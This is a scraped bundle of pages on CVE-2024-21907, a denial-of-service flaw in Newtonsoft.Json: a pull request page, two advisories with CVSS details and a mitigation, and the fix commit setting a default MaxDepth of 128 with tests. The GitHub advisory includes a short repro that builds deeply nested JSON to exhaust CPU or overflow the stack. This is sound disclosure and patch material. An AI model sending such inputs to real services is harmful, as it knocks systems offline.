 [![@JamesNK](https://avatars.githubusercontent.com/u/303201?s=40&u=a4521438844aae7f844f8717a79a9858d6c805da&v=4)](/JamesNK)
[JamesNK](/JamesNK)
deleted the
jamesnk/defaultmaxdepth

branch
[January 31, 2021 02:57](#event-4269869609)

[![@mcon](https://avatars.githubusercontent.com/u/3117092?s=40&v=4)](/mcon)
[mcon](/mcon)
mentioned this pull request
[Mar 25, 2021](#ref-pullrequest-840791129)

[Fix MaxDepth problems introduced between 12.0.3 and 13.0.1
#2504](/JamesNK/Newtonsoft.Json/pull/2504)
 Closed

[![@nspruit](https://avatars.githubusercontent.com/u/3593160?s=40&v=4)](/nspruit)
[nspruit](/nspruit)
mentioned this pull request
[May 25, 2021](#ref-pullrequest-870791869)

[chore: Update Newtonsoft.Json to version 13.0.1
DarkLiKally/I18Next.Net#13](/DarkLiKally/I18Next.Net/pull/13)
 Merged

[![@ericoporto](https://avatars.githubusercontent.com/u/2244442?s=40&v=4)](/ericoporto)
[ericoporto](/ericoporto)
mentioned this pull request
[Jun 23, 2022](#ref-pullrequest-1280415990)

[Bump Newtonsoft.Json from 10.0.3 to 13.0.1 in /Editor/AGS.Editor
adventuregamestudio/ags#1701](/adventuregamestudio/ags/pull/1701)
 Closed

[![@cvivieca](https://avatars.githubusercontent.com/u/22035782?s=40&v=4)](/cvivieca)
[cvivieca](/cvivieca)
mentioned this pull request
[Jun 23, 2022](#ref-pullrequest-1282919871)

[Upgrade NewtonSoft to version 13.0.1
halforbit/data-stores#17](/halforbit/data-stores/pull/17)
 Closed

[![@shaopeng-gh](https://avatars.githubusercontent.com/u/81775155?s=40&v=4)](/shaopeng-gh)
[shaopeng-gh](/shaopeng-gh)
mentioned this pull request
[Aug 3, 2022](#ref-pullrequest-1322527468)

[Newtonsoft update.
microsoft/sarif-sdk#2515](/microsoft/sarif-sdk/pull/2515)
 Merged

[![@ytang1-godaddy](https://avatars.githubusercontent.com/u/72579004?s=40&v=4)](/ytang1-godaddy)
[ytang1-godaddy](/ytang1-godaddy)
mentioned this pull request
[Feb 6, 2023](#ref-issue-1573452626)

[Cx46691637-14e8 @ Nuget-Newtonsoft.Json-9.0.1
ytang1-godaddy/aws-cdk-examples#9](/ytang1-godaddy/aws-cdk-examples/issues/9)

Open

[![@vitorrubio](https://avatars.githubusercontent.com/u/5557238?s=40&v=4)](/vitorrubio)
[vitorrubio](/vitorrubio)
mentioned this pull request
[Feb 23, 2023](#ref-issue-1596150252)

[consider updating newtonsoft Json.NET to Version 13.0.2
DalSoft/DalSoft.RestClient#109](/DalSoft/DalSoft.RestClient/issues/109)

Closed

[![@Yannike](https://avatars.githubusercontent.com/u/6811819?s=40&v=4)](/Yannike)
[Yannike](/Yannike)
mentioned this pull request
[Jul 17, 2023](#ref-pullrequest-1807098659)

[Upgrade packages that have a dependence to a vulnerable version of NewtonSoft.Json
DotSpatial/DotSpatial#1517](/DotSpatial/DotSpatial/pull/1517)
 Open

[![@06luki06](https://avatars.githubusercontent.com/u/95306265?s=40&v=4)](/06luki06)
[06luki06](/06luki06)
mentioned this pull request
[Nov 19, 2024](#ref-issue-2672060385)

[Dependency Check
JamesNK/Newtonsoft.Json.Bson#46](/JamesNK/Newtonsoft.Json.Bson/issues/46)

Closed

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FJamesNK%2FNewtonsoft.Json%2Fpull%2F2462)

Reviewers

No reviews

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

 [Applications that use Newtonsoft.Json might be exposed to DOS vulnerability](https://github.com/JamesNK/Newtonsoft.Json/issues/2459)

 [ALEPH-2018004 - DOS vulnerability](https://github.com/JamesNK/Newtonsoft.Json/issues/2457)

1 participant

[![@JamesNK](https://avatars.githubusercontent.com/u/303201?s=52&v=4)](/JamesNK)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from vulncheck.com_63374d29_20250111_034740.html ===

## Cookies

We use our own cookies and third-party cookies so that we can display this website correctly and better understand how this website is used, with a view to improving the services we offer. A decision on cookie usage permissions can be changed anytime using the cookie button that will appear after a selection has been made on this banner.

AcceptDeclineLearn more and customize[Products](/product)[Government](/government)Resources[Community](/community)Open Source[Company](/company)Go back

Mismanagement of Exceptional Conditions in Newtonsoft.Json

severityHighdateJanuary 3, 2024Affecting

* Newtonsoft.Json versions less than 13.0.1

CVECVE-2024-21907CVE typeImproper Handling of Exceptional ConditionsCVSS7.5CVSS V3 VectorCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:HReferences

* [Issue tracking](https://github.com/JamesNK/Newtonsoft.Json/issues/2457)
* [Related link](https://github.com/JamesNK/Newtonsoft.Json/pull/2462)
* [Related link](https://github.com/JamesNK/Newtonsoft.Json/commit/7e77bbe1beccceac4fc7b174b53abfefac278b66)
* [Related link](https://alephsecurity.com/2018/10/22/StackOverflowException/)
* [Related link](https://alephsecurity.com/vulns/aleph-2018004)
* [Related link](https://security.snyk.io/vuln/SNYK-DOTNET-NEWTONSOFTJSON-2774678)
* [Third party advisory](https://github.com/advisories/GHSA-5crp-9r3c-p9vr)

FooterVulnCheck helps organizations outpace adversaries with vulnerability intelligence that predicts avenues of attack with speed and accuracy.© 2025 VulnCheck Inc.Products

* [Exploit & Vulnerability Intelligence](/product/exploit-intelligence)
* [Initial Access Intelligence](/product/initial-access-intelligence)
* [IP Intelligence](/product/ip-intelligence)
* [VulnCheck for Government](/government)

Resources

* [Documentation](https://docs.vulncheck.com/)
* [API](https://docs.vulncheck.com/api)
* [Changelog](https://docs.vulncheck.com/changelog)
* [Glossary](https://docs.vulncheck.com/glossary/terms)
* Contact Support

Community

* [VulnCheck KEV](/kev)
* [NVD++](/nvd2)
* [XDB](/xdb)
* [Knowledge Base](/blog?tags=101)
* [Report a Vulnerability](/advisories/report)

Open Source

* [SDK for Go](https://github.com/vulncheck-oss/sdk-go)
* [SDK for Python](https://github.com/vulncheck-oss/sdk-python)
* [CLI](https://github.com/vulncheck-oss/cli)
* [GitHub Action](https://github.com/vulncheck-oss/action)
* [go-exploit](https://github.com/vulncheck-oss/go-exploit)

Company

* [Blog](/blog)
* [News and Awards](/news)
* [Press Releases](/press)
* [Partners](/partners)
* [Events](/events)
* [VulnCheck Advisories](/advisories)
* [Leadership Team](/company/about)

Legal

* [Privacy Policy](/privacy)
* [Terms & Conditions](/terms)
* [Vulnerability Disclosure Policy](/vulnerability-disclosure-policy)



=== Content from github.com_329dd146_20250111_034738.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-5crp-9r3c-p9vr)

**CVE-2024-21907**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-5crp-9r3c-p9vr)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [GitHub Reviewed](/advisories?query=type%3Areviewed)
3. [CVE-2024-21907](/advisories/GHSA-5crp-9r3c-p9vr)

## Improper Handling of Exceptional Conditions in Newtonsoft.Json

High severity

GitHub Reviewed

Published
Jun 22, 2022
to the GitHub Advisory Database
•
Updated Jan 3, 2024

[Vulnerability details](/advisories/GHSA-5crp-9r3c-p9vr)
[Dependabot alerts
0](/advisories/GHSA-5crp-9r3c-p9vr/dependabot)

## Package

nuget

Newtonsoft.Json
([NuGet](/advisories?query=ecosystem%3Anuget))

## Affected versions

< 13.0.1

## Patched versions

13.0.1

## Description

Newtonsoft.Json prior to version 13.0.1 is vulnerable to Insecure Defaults due to improper handling of expressions with high nesting level that lead to StackOverFlow exception or high CPU and RAM usage. Exploiting this vulnerability results in Denial Of Service (DoS).

The serialization and deserialization path have different properties regarding the issue.

Deserializing methods (like `JsonConvert.DeserializeObject`) will process the input that results in burning the CPU, allocating memory, and consuming a thread of execution. Quite high nesting level (>10kk, or 9.5MB of `{a:{a:{...` input) is needed to achieve the latency over 10 seconds, depending on the hardware.

Serializing methods (like `JsonConvert.Serialize` or `JObject.ToString`) will throw StackOverFlow exception with the nesting level of around 20k.

To mitigate the issue one either need to update Newtonsoft.Json to 13.0.1 or set `MaxDepth` parameter in the `JsonSerializerSettings`. This can be done globally with the following statement. After that the parsing of the nested input will fail fast with `Newtonsoft.Json.JsonReaderException`:

```
JsonConvert.DefaultSettings = () => new JsonSerializerSettings { MaxDepth = 128 };

```

Repro code:

```
//Create a string representation of an highly nested object (JSON serialized)
int nRep = 25000;
string json = string.Concat(Enumerable.Repeat("{a:", nRep)) + "1" +
 string.Concat(Enumerable.Repeat("}", nRep));

//Parse this object (leads to high CPU/RAM consumption)
var parsedJson = JsonConvert.DeserializeObject(json);

// Methods below all throw stack overflow with nRep around 20k and higher
// string a = parsedJson.ToString();
// string b = JsonConvert.SerializeObject(parsedJson);

```
### Additional affected product and version information

**The original statement about the problem only affecting IIS applications is misleading.** Any application is affected, however the IIS has a behavior that stops restarting the instance after some time resulting in a harder-to-fix DoS.\*\*

### References

* [JamesNK/Newtonsoft.Json#2457](https://github.com/JamesNK/Newtonsoft.Json/issues/2457)
* [JamesNK/Newtonsoft.Json#2462](https://github.com/JamesNK/Newtonsoft.Json/pull/2462)
* [JamesNK/Newtonsoft.Json@7e77bbe](https://github.com/JamesNK/Newtonsoft.Json/commit/7e77bbe1beccceac4fc7b174b53abfefac278b66)
* <https://alephsecurity.com/2018/10/22/StackOverflowException/>
* <https://alephsecurity.com/vulns/aleph-2018004>
* <https://security.snyk.io/vuln/SNYK-DOTNET-NEWTONSOFTJSON-2774678>

Published to the GitHub Advisory Database
Jun 22, 2022

Reviewed
Jun 22, 2022

Last updated
Jan 3, 2024

### Severity

High

7.5

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
None

Integrity
None

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

### [EPSS score](https://www.first.org/epss/user-guide)

0.307%
 (70th percentile)

### Weaknesses

[CWE-755](/advisories?query=cwe%3A755)

### CVE ID

CVE-2024-21907

### GHSA ID

GHSA-5crp-9r3c-p9vr

### Source code

[JamesNK/Newtonsoft.Json](https://github.com/JamesNK/Newtonsoft.Json)

### Credits

* [![@ezsilmar](https://avatars.githubusercontent.com/u/5860161?s=40&v=4)](/ezsilmar)
  [ezsilmar](/ezsilmar)
  Analyst
* [![@JamesNK](https://avatars.githubusercontent.com/u/303201?s=40&v=4)](/JamesNK)
  [JamesNK](/JamesNK)
  Analyst

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-5crp-9r3c-p9vr/improve).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_883c9a3c_20250111_034736.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FJamesNK%2FNewtonsoft.Json%2Fcommit%2F7e77bbe1beccceac4fc7b174b53abfefac278b66)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FJamesNK%2FNewtonsoft.Json%2Fcommit%2F7e77bbe1beccceac4fc7b174b53abfefac278b66)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=JamesNK%2FNewtonsoft.Json)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[JamesNK](/JamesNK)
/
**[Newtonsoft.Json](/JamesNK/Newtonsoft.Json)**
Public

* [Notifications](/login?return_to=%2FJamesNK%2FNewtonsoft.Json) You must be signed in to change notification settings
* [Fork
  3.3k](/login?return_to=%2FJamesNK%2FNewtonsoft.Json)
* [Star
   10.9k](/login?return_to=%2FJamesNK%2FNewtonsoft.Json)

* [Code](/JamesNK/Newtonsoft.Json)
* [Issues
  708](/JamesNK/Newtonsoft.Json/issues)
* [Pull requests
  76](/JamesNK/Newtonsoft.Json/pulls)
* [Actions](/JamesNK/Newtonsoft.Json/actions)
* [Projects
  0](/JamesNK/Newtonsoft.Json/projects)
* [Security](/JamesNK/Newtonsoft.Json/security)
* [Insights](/JamesNK/Newtonsoft.Json/pulse)

Additional navigation options

* [Code](/JamesNK/Newtonsoft.Json)
* [Issues](/JamesNK/Newtonsoft.Json/issues)
* [Pull requests](/JamesNK/Newtonsoft.Json/pulls)
* [Actions](/JamesNK/Newtonsoft.Json/actions)
* [Projects](/JamesNK/Newtonsoft.Json/projects)
* [Security](/JamesNK/Newtonsoft.Json/security)
* [Insights](/JamesNK/Newtonsoft.Json/pulse)

## Commit

[Permalink](/JamesNK/Newtonsoft.Json/commit/7e77bbe1beccceac4fc7b174b53abfefac278b66)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Change JsonReader and JsonSerializer default max depth to 128 ([#2462](https://github.com/JamesNK/Newtonsoft.Json/pull/2462))

[Browse files](/JamesNK/Newtonsoft.Json/tree/7e77bbe1beccceac4fc7b174b53abfefac278b66)
Browse the repository at this point in the history

* Loading branch information

[![@JamesNK](https://avatars.githubusercontent.com/u/303201?s=40&v=4)](/JamesNK)

[JamesNK](/JamesNK/Newtonsoft.Json/commits?author=JamesNK "View all commits by JamesNK")
authored
Jan 31, 2021

1 parent
[42139ea](/JamesNK/Newtonsoft.Json/commit/42139ea6cd8d500790bf27c9afc69fd66eab60ad)

commit 7e77bbe

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**48 additions**
and
**3 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* Src

  + Newtonsoft.Json.Tests/Serialization

    - Src/Newtonsoft.Json.Tests/Serialization/JsonSerializerTest.cs
      [JsonSerializerTest.cs](#diff-1520efe54bcc9610ba350ef53a3b244870dc5b19a4da5174401c3f06ce83d80c)
  + Newtonsoft.Json

    - Src/Newtonsoft.Json/JsonReader.cs
      [JsonReader.cs](#diff-8de6a21bdac4d467c33ddcc2469845865834ce506531a751a518e85daec3a7e0)
    - Src/Newtonsoft.Json/JsonSerializer.cs
      [JsonSerializer.cs](#diff-8aaa0f01348513a119b3c4a0136bf099b246b6f2050952b4cdee01232bd18bbe)
    - Src/Newtonsoft.Json/JsonSerializerSettings.cs
      [JsonSerializerSettings.cs](#diff-c35f33ecfb40348a47f9e6cee6c162ef4cad59d70fb1216d62180dbe59562aa4)

## There are no files selected for viewing

41 changes: 41 additions & 0 deletions

41
[Src/Newtonsoft.Json.Tests/Serialization/JsonSerializerTest.cs](#diff-1520efe54bcc9610ba350ef53a3b244870dc5b19a4da5174401c3f06ce83d80c "Src/Newtonsoft.Json.Tests/Serialization/JsonSerializerTest.cs")

Show comments

[View file](/JamesNK/Newtonsoft.Json/blob/7e77bbe1beccceac4fc7b174b53abfefac278b66/Src/Newtonsoft.Json.Tests/Serialization/JsonSerializerTest.cs)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -7995,5 +7995,46 @@ public void NullableDoubleEmptyValue() |
|  |  | () => JsonConvert.DeserializeObject<EmptyJsonValueTestClass>("{ A: \"\", B: 1, C: 123, D: 1.23, E: , F: null }"), |
|  |  | "Unexpected character encountered while parsing value: ,. Path 'E', line 1, position 36."); |
|  |  | } |
|  |  |  |
|  |  | [Test] |
|  |  | public void SetMaxDepth\_DepthExceeded() |
|  |  | { |
|  |  | JsonTextReader reader = new JsonTextReader(new StringReader("[[['text']]]")); |
|  |  | Assert.AreEqual(128, reader.MaxDepth); |
|  |  |  |
|  |  | JsonSerializerSettings settings = new JsonSerializerSettings(); |
|  |  | Assert.AreEqual(128, settings.MaxDepth); |
|  |  | Assert.AreEqual(false, settings.\_maxDepthSet); |
|  |  |  |
|  |  | // Default should be the same |
|  |  | Assert.AreEqual(reader.MaxDepth, settings.MaxDepth); |
|  |  |  |
|  |  | settings.MaxDepth = 2; |
|  |  | Assert.AreEqual(2, settings.MaxDepth); |
|  |  | Assert.AreEqual(true, settings.\_maxDepthSet); |
|  |  |  |
|  |  | JsonSerializer serializer = JsonSerializer.Create(settings); |
|  |  | Assert.AreEqual(2, serializer.MaxDepth); |
|  |  |  |
|  |  | ExceptionAssert.Throws<JsonReaderException>( |
|  |  | () => serializer.Deserialize(reader), |
|  |  | "The reader's MaxDepth of 2 has been exceeded. Path '[0][0]', line 1, position 3."); |
|  |  | } |
|  |  |  |
|  |  | [Test] |
|  |  | public void SetMaxDepth\_DepthNotExceeded() |
|  |  | { |
|  |  | JsonTextReader reader = new JsonTextReader(new StringReader("['text']")); |
|  |  | JsonSerializerSettings settings = new JsonSerializerSettings(); |
|  |  |  |
|  |  | settings.MaxDepth = 2; |
|  |  |  |
|  |  | JsonSerializer serializer = JsonSerializer.Create(settings); |
|  |  | Assert.AreEqual(2, serializer.MaxDepth); |
|  |  |  |
|  |  | serializer.Deserialize(reader); |
|  |  |  |
|  |  | Assert.AreEqual(128, reader.MaxDepth); |
|  |  | } |
|  |  | } |
|  |  | } |

3 changes: 3 additions & 0 deletions

3
[Src/Newtonsoft.Json/JsonReader.cs](#diff-8de6a21bdac4d467c33ddcc2469845865834ce506531a751a518e85daec3a7e0 "Src/Newtonsoft.Json/JsonReader.cs")

Show comments

[View file](/JamesNK/Newtonsoft.Json/blob/7e77bbe1beccceac4fc7b174b53abfefac278b66/Src/Newtonsoft.Json/JsonReader.cs)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -227,6 +227,8 @@ public string? DateFormatString |
|  |  |  |
|  |  | /// <summary> |
|  |  | /// Gets or sets the maximum depth allowed when reading JSON. Reading past this depth will throw a <see cref="JsonReaderException"/>. |
|  |  | /// A null value means there is no maximum. |
|  |  | /// The default value is <c>128</c>. |
|  |  | /// </summary> |
|  |  | public int? MaxDepth |
|  |  | { |
| Expand Down  Expand Up | | @@ -327,6 +329,7 @@ protected JsonReader() |
|  |  | \_dateTimeZoneHandling = DateTimeZoneHandling.RoundtripKind; |
|  |  | \_dateParseHandling = DateParseHandling.DateTime; |
|  |  | \_floatParseHandling = FloatParseHandling.Double; |
|  |  | \_maxDepth = 128; |
|  |  |  |
|  |  | CloseInput = true; |
|  |  | } |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[Src/Newtonsoft.Json/JsonSerializer.cs](#diff-8aaa0f01348513a119b3c4a0136bf099b246b6f2050952b4cdee01232bd18bbe "Src/Newtonsoft.Json/JsonSerializer.cs")

Show comments

[View file](/JamesNK/Newtonsoft.Json/blob/7e77bbe1beccceac4fc7b174b53abfefac278b66/Src/Newtonsoft.Json/JsonSerializer.cs)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -514,7 +514,7 @@ public virtual CultureInfo Culture |
|  |  | /// <summary> |
|  |  | /// Gets or sets the maximum depth allowed when reading JSON. Reading past this depth will throw a <see cref="JsonReaderException"/>. |
|  |  | /// A null value means there is no maximum. |
|  |  | /// The default value is <c>null</c>. |
|  |  | /// The default value is <c>128</c>. |
|  |  | /// </summary> |
|  |  | public virtual int? MaxDepth |
|  |  | { |
| Expand Down | |  |

5 changes: 3 additions & 2 deletions

5
[Src/Newtonsoft.Json/JsonSerializerSettings.cs](#diff-c35f33ecfb40348a47f9e6cee6c162ef4cad59d70fb1216d62180dbe59562aa4 "Src/Newtonsoft.Json/JsonSerializerSettings.cs")

Show comments

[View file](/JamesNK/Newtonsoft.Json/blob/7e77bbe1beccceac4fc7b174b53abfefac278b66/Src/Newtonsoft.Json/JsonSerializerSettings.cs)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -61,6 +61,7 @@ public class JsonSerializerSettings |
|  |  | internal static readonly CultureInfo DefaultCulture; |
|  |  | internal const bool DefaultCheckAdditionalContent = false; |
|  |  | internal const string DefaultDateFormatString = @"yyyy'-'MM'-'dd'T'HH':'mm':'ss.FFFFFFFK"; |
|  |  | internal const int DefaultMaxDepth = 128; |
|  |  |  |
|  |  | internal Formatting? \_formatting; |
|  |  | internal DateFormatHandling? \_dateFormatHandling; |
| Expand Down  Expand Up | | @@ -325,11 +326,11 @@ public string DateFormatString |
|  |  | /// <summary> |
|  |  | /// Gets or sets the maximum depth allowed when reading JSON. Reading past this depth will throw a <see cref="JsonReaderException"/>. |
|  |  | /// A null value means there is no maximum. |
|  |  | /// The default value is <c>null</c>. |
|  |  | /// The default value is <c>128</c>. |
|  |  | /// </summary> |
|  |  | public int? MaxDepth |
|  |  | { |
|  |  | get => \_maxDepth; |
|  |  | get => \_maxDepthSet ? \_maxDepth : DefaultMaxDepth; |
|  |  | set |
|  |  | { |
|  |  | if (value <= 0) |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

